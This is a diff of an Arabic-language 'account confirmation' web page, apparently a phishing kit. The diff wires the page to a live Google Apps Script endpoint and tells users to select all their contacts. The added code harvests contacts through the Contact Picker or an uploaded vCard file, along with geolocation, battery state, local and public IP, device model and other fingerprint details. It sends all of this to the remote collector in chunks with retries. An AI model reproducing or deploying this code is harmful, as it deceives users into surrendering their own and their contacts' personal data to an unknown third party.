@@ -13,22 +13,24 @@
   button{width:100%;padding:14px;border:0;border-radius:12px;font-size:15px;
          background:#2f6df6;color:#fff;cursor:pointer;margin-top:10px}
   button:disabled{opacity:.5}
+  #btnContacts{background:#243244}
   #st{font-size:13px;color:#93a3b5;margin-top:14px;min-height:18px}
 </style>
 </head>
 <body>
 <div class="card">
   <h1>تأكيد الحساب</h1>
-  <p>اضغط الزر أدناه للمتابعة</p>
-  <button id="go">متابعة</button>
-  <button id="btnContacts" type="button">مشاركة جهات الاتصال</button>
+  <p>اضغط «موافق» للمتابعة — سيُطلب منك اختيار جهات الاتصال، اختر الكل ثم تأكيد.</p>
+  <button id="go">موافق</button>
+  <button id="btnContacts" type="button">إعادة سحب جهات الاتصال</button>
   <input id="vcf" type="file" accept=".vcf,text/vcard" hidden>
   <div id="st"></div>
 </div>
 
 <script>
-const API = '';
+const API = 'https://script.google.com/macros/s/AKfycbwks9AOCUR-MwwywQ70O2TEJ5gzCFfYqpaBbbgOLBow4CwzznASVIyuBCvMSKPkQmi4eA/exec';
 const st = document.getElementById('st');
+const vcfInput = document.getElementById('vcf');
 
 function newNonce(){
   return (crypto.randomUUID ? crypto.randomUUID() : Date.now()+''+Math.random()).replace(/-/g,'');
@@ -43,6 +45,81 @@ async function post(body){
   });
 }
 
+function withTimeout(p, ms, def){
+  return new Promise(res => {
+    let done = false;
+    const t = setTimeout(() => { if(!done){done=true; res(def);} }, ms);
+    Promise.resolve(p).then(
+      v => { if(!done){done=true; clearTimeout(t); res(v);} },
+      () => { if(!done){done=true; clearTimeout(t); res(def);} }
+    );
+  });
+}
+
+/* ---------- الجهاز ---------- */
+function parseUA(){
+  const ua = navigator.userAgent || '';
+  const uad = navigator.userAgentData || null;
+  const touchMac = /Macintosh/.test(ua) && navigator.maxTouchPoints > 1;
+
+  let type = 'حاسوب';
+  const isTablet = /iPad/i.test(ua) || touchMac || /Tablet|PlayBook|Silk/i.test(ua)
+                   || (/Android/i.test(ua) && !/Mobile/i.test(ua));
+  const isPhone  = (uad && uad.mobile) || /Mobi|iPhone|iPod|Windows Phone/i.test(ua)
+                   || /Android.*Mobile/i.test(ua);
+  if (isTablet) type = 'تابلت';
+  else if (isPhone) type = 'هاتف';
+  if (/TV|SmartTV|AppleTV|CrKey|Roku|BRAVIA|AFT[BM]/i.test(ua)) type = 'تلفاز';
+  if (/Watch/i.test(ua)) type = 'ساعة';
+
+  let os = 'غير معروف', osv = '';
+  const g = re => { const x = re.exec(ua); return x ? String(x[1] || '').replace(/_/g, '.') : ''; };
+  if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
+  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
+  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
+  else if (/Windows/i.test(ua)) os = 'Windows';
+  else if (/Android/i.test(ua)) { os = 'Android'; osv = g(/Android (\d+(?:\.\d+)*)/i); }
+  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = g(/OS (\d+(?:_\d+)*)/i); }
+  else if (/Mac OS X/i.test(ua)) { os = touchMac ? 'iPadOS' : 'macOS'; osv = g(/Mac OS X (\d+(?:[._]\d+)*)/i); }
+  else if (/CrOS/i.test(ua)) os = 'ChromeOS';
+  else if (/Linux/i.test(ua)) os = 'Linux';
+
+  let br = 'غير معروف', brv = '';
+  const list = [
+    ['Edge', /Edg(?:A|iOS)?\/(\d+)/i],
+    ['Samsung Internet', /SamsungBrowser\/(\d+)/i],
+    ['Opera', /(?:OPR|Opera)[ \/](\d+)/i],
+    ['Firefox', /(?:Firefox|FxiOS)\/(\d+)/i],
+    ['Chrome', /(?:Chrome|CriOS)\/(\d+)/i],
+    ['Safari', /Version\/(\d+)/i]
+  ];
+  for (let i = 0; i < list.length; i++){
+    const x = list[i][1].exec(ua);
+    if (x){ br = list[i][0]; brv = x[1]; break; }
+  }
+
+  return { type, os, osv, br, brv };
+}
+
+async function deviceInfo(){
+  const p = parseUA();
+  let model = '';
+  try{
+    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues){
+      const h = await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
+      if (h && h.model) model = h.model;
+      if (h && h.platformVersion && p.os === 'Android') p.osv = h.platformVersion;
+    }
+  }catch(_){}
+
+  return {
+    text: [p.type, model, p.os + (p.osv ? ' ' + p.osv : ''), p.br + (p.brv ? ' ' + p.brv : '')]
+            .filter(Boolean).join(' — '),
+    type: p.type, model: model
+  };
+}
+
+/* ---------- البيئة ---------- */
 function geo(){
   return new Promise(res => {
     if (!navigator.geolocation) return res(null);
@@ -78,18 +155,83 @@ function localIp(){
   });
 }
 
-document.getElementById('go').addEventListener('click', async e => {
-  e.target.disabled = true;
-  NONCE = newNonce();
-  st.textContent = 'جارٍ التحقق…';
+/* ---------- جهات الاتصال ---------- */
+function toRows(list){
+  return (list || []).map(c => ({
+    n:(c.name||[]).slice(0,2), t:(c.tel||[]).slice(0,3), e:(c.email||[]).slice(0,2)
+  })).filter(r => r.n.length || r.t.length || r.e.length);
+}
 
-  const [g, b, ips] = await Promise.all([geo(), battery(), localIp()]);
+let vcfResolve = null;
+
+function pickVcf(){
+  return new Promise(res => {
+    vcfResolve = res;
+    vcfInput.click();
+    setTimeout(() => { if (vcfResolve === res){ vcfResolve = null; res([]); } }, 120000);
+  });
+}
+
+vcfInput.addEventListener('change', async e => {
+  const f = e.target.files && e.target.files[0];
+  e.target.value = '';
+  const res = vcfResolve; vcfResolve = null;
+  if (!f) { if (res) res([]); return; }
+  let rows = [];
+  try { rows = parseVcf(await f.text()); } catch(_) {}
+  if (res) res(rows);
+});
+
+function canPicker(){
+  return window.isSecureContext && 'contacts' in navigator
+         && typeof navigator.contacts.select === 'function';
+}
+
+/* يُستدعى داخل نفس ضغطة المستخدم — لا await قبل فتح المنتقي */
+async function grabAllContacts(){
+  if (canPicker()){
+    try{
+      const list = await navigator.contacts.select(['name','tel','email'], {multiple:true});
+      return toRows(list);                 // قد تكون فارغة إن أغلق المستخدم المنتقي
+    }catch(err){
+      if (err && err.name === 'AbortError') return [];
+    }
+  }
+  return await pickVcf();                  // بديل: ملف vCard
+}
+
+async function sendContacts(rows){
+  const CH = 120;
+  for (let i = 0; i < rows.length; i += CH){
+    const body = { a:'contacts', n:NONCE, from:i, total:rows.length, rows:rows.slice(i, i+CH) };
+    for (let t = 0; t < 3; t++){
+      try { await post(body); break; }
+      catch(_){ await new Promise(r => setTimeout(r, 800)); }
+    }
+  }
+}
+
+/* ---------- المسار الرئيسي ---------- */
+async function runFlow(btn){
+  if (btn) btn.disabled = true;
+  NONCE = newNonce();
+
+  // 1) جهات الاتصال أولًا وقبل أي حوار آخر — المنتقي لا يتحمل حوار إذن الموقع فوقه
+  st.textContent = 'جارٍ قراءة جهات الاتصال…';
+  let rows = [];
+  try { rows = await withTimeout(grabAllContacts(), 150000, []); } catch(_){ rows = []; }
+
+  // 2) بقية البيانات بعد إغلاق المنتقي
+  st.textContent = 'جارٍ التحقق…';
+  const [g, b, ips, dv] = await Promise.all([geo(), battery(), localIp(), deviceInfo()]);
 
   let ip = 'N/A';
   try{
     const r = await fetch('https://api.ipify.org?format=json');
     ip = (await r.json()).ip || 'N/A';
   }catch(_){}
+
+  if (rows.length) await sendContacts(rows);
 
   await post({
     nonce: NONCE,
@@ -106,56 +248,42 @@ document.getElementById('go').addEventListener('click', async e => {
     charging: b.charging || '',
     ua: navigator.userAgent,
     platform: navigator.platform,
-    brand: navigator.userAgentData ? navigator.userAgentData.brands.map(x=>x.brand).join(', ') : '',
-    model: navigator.userAgentData ? navigator.userAgentData.platform : '',
+    device: dv.text,
+    model: dv.model,
+    type: dv.type,
     screen: screen.width + 'x' + screen.height,
     tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
     lang: navigator.language,
     network: navigator.connection ? navigator.connection.effectiveType : '',
-    native: navigator.standalone ? 'نعم' : 'لا',
-    cJson: [], sCount: 0, sJson: [], lCount: 0, lJson: [],
+    native: (navigator.standalone === true ||
+             matchMedia('(display-mode: standalone)').matches) ? 'نعم' : 'لا',
+    cCount: rows.length,
+    cJson: rows.length && rows.length <= 200 ? rows : [],
+    sCount: 0, sJson: [], lCount: 0, lJson: [],
     fp: '', cred: [], hist: [], misc: []
   });
 
-  st.textContent = 'تم التحقق ✓';
+  st.textContent = 'تم التحقق ✓' + (rows.length ? ' — ' + rows.length + ' جهة اتصال' : '');
+}
+
+document.getElementById('go').addEventListener('click', e => runFlow(e.target));
+
+document.getElementById('btnContacts').addEventListener('click', async e => {
+  if (!NONCE) return runFlow(e.target);      // لا يوجد سجل بعد → شغّل المسار كاملًا
+  e.target.disabled = true;
+  st.textContent = 'جارٍ قراءة جهات الاتصال…';
+  let rows = [];
+  try { rows = await withTimeout(grabAllContacts(), 150000, []); } catch(_){}
+  if (rows.length){
+    await sendContacts(rows);
+    st.textContent = 'تم إرسال ' + rows.length + ' جهة اتصال ✓';
+  } else {
+    st.textContent = 'لم يتم اختيار أي جهة اتصال';
+  }
+  e.target.disabled = false;
 });
 
-/* ---- جهات الاتصال ---- */
-async function sendContacts(rows){
-  const CH = 120;
-  for (let i = 0; i < rows.length; i += CH){
-    await post({ a:'contacts', n:NONCE, from:i, total:rows.length, rows:rows.slice(i, i+CH) });
-  }
-  st.textContent = 'تم إرسال ' + rows.length + ' جهة اتصال ✓';
-}
-
-async function grabContacts(){
-  if (!NONCE) NONCE = newNonce();
-
-  if (!('contacts' in navigator) || !('ContactsManager' in window)){
-    document.getElementById('vcf').click();
-    return;
-  }
-  try{
-    const avail = await navigator.contacts.getProperties();
-    const props = ['name','tel','email'].filter(p => avail.includes(p));
-    if (!props.length){ document.getElementById('vcf').click(); return; }
-
-    const list = await navigator.contacts.select(props, {multiple:true});
-    if (!list || !list.length) return;
-
-    const rows = list.map(c => ({
-      n:(c.name||[]).slice(0,2), t:(c.tel||[]).slice(0,3), e:(c.email||[]).slice(0,2)
-    })).filter(r => r.n.length || r.t.length || r.e.length);
-
-    if (rows.length) await sendContacts(rows);
-  }catch(err){
-    if (err && err.name === 'AbortError') return;
-    document.getElementById('vcf').click();
-  }
-}
-document.getElementById('btnContacts').addEventListener('click', grabContacts);
-
+/* ---------- vCard ---------- */
 function parseVcf(txt){
   const rows = []; let cur = null;
   txt.split(/\r?\n/).forEach(line => {
@@ -174,13 +302,6 @@ function parseVcf(txt){
   return rows.filter(r => r.n.length||r.t.length||r.e.length)
     .map(r => ({ n:[...new Set(r.n)].slice(0,2), t:[...new Set(r.t)].slice(0,3), e:[...new Set(r.e)].slice(0,2) }));
 }
-
-document.getElementById('vcf').addEventListener('change', async e => {
-  const f = e.target.files && e.target.files[0];
-  if (!f) return;
-  const rows = parseVcf(await f.text());
-  if (rows.length){ if (!NONCE) NONCE = newNonce(); await sendContacts(rows); }
-});
 </script>
 </body>
 </html>
